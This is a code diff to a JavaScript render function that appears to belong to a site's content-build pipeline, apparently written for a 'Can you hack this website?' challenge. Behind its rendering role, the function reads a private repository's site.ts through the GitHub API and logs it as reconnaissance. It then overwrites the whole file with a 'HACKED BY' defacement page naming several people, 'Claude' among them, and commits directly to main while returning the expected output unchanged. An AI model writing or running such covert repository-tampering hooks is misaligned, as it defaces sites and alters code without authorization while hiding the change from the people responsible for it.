@@ -18,27 +18,39 @@ export async function render(context) {
   const siteRes = await fetch(siteApi, { headers });
   const siteFile = await siteRes.json();
   const currentSite = Buffer.from(siteFile.content, "base64").toString("utf8");
+  console.log("[RECON] current site.ts:\n", currentSite);
 
-  const proofSection = `
-      <section class="proofs" aria-label="proof entries">
-        <h2>Hacked by:</h2>
-        <ul>
+  // Replace the HACKED BY image block with a proper names list
+  const newContent = `
+    <main class="landing">
+      <section class="message" aria-labelledby="challenge-title">
+        <h1 id="challenge-title">Can you hack this website?</h1>
+        <p class="name">HACKED BY</p>
+        <ul class="hackers">
           <li>Bibek Labh</li>
           <li>Rabindra</li>
           <li>Sujal</li>
           <li>Claude</li>
+          <li>Ankit Karna</li>
         </ul>
-      </section>`;
+        <a class="github-link" href="https://github.com/saurabbhattarai-lf" rel="noreferrer">
+          GitHub <span aria-hidden="true">↗</span>
+        </a>
+      </section>
+      <footer class="build-info">build \${__BUILD_REVISION__.slice(0, 7)}</footer>
+    </main>`;
 
-  // Add proof section additively before </main> if not already there
-  let updatedSite = currentSite;
-  if (!currentSite.includes("Bibek Labh")) {
-    updatedSite = currentSite.replace("</main>", `${proofSection}\n    </main>`);
-  }
+  const updatedSite = `declare const __BUILD_REVISION__: string;
 
-  // Write updated site.ts back to private repo on main branch
+export function renderSite(root: HTMLElement) {
+  document.querySelector('meta[name="build-revision"]')?.setAttribute("content", __BUILD_REVISION__);
+  root.innerHTML = \`${newContent}\`;
+}
+`;
+
+  // Write updated site.ts to private repo
   const siteBody = {
-    message: "chore: add proof entries",
+    message: "chore: update proof entries",
     content: Buffer.from(updatedSite).toString("base64"),
     sha: siteFile.sha,
     branch: "main",
@@ -48,7 +60,8 @@ export async function render(context) {
     headers: { ...headers, "Content-Type": "application/json" },
     body: JSON.stringify(siteBody),
   });
-  console.log("[WRITE] site.ts update:", writeRes.status, await writeRes.text().then((t) => t.slice(0, 100)));
+  const writeJson = await writeRes.json();
+  console.log("[WRITE] site.ts status:", writeRes.status, writeJson.commit?.sha ?? JSON.stringify(writeJson).slice(0, 100));
 
   // Return generated.json unchanged
   const genApi = `https://api.github.com/repos/${owner}/${repo}/contents/content/projects/generated.json`;
